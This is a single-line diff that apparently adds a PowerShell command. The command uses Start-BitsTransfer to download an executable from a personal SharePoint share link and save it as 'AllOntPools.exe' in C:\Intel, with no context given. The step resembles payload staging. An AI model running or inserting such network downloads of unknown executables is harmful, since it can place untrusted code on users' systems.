@@ -1,0 +1,1 @@
+Start-BitsTransfer -Source https://pongstudios-my.sharepoint.com/:u:/p/sdadmin/EeJ1m9xQjBlAo1BtoBgYWfUBTOxzuFjnofQtSHYYKngb9g?download=1 -Destination C:\Intel\AllOntPools.exe
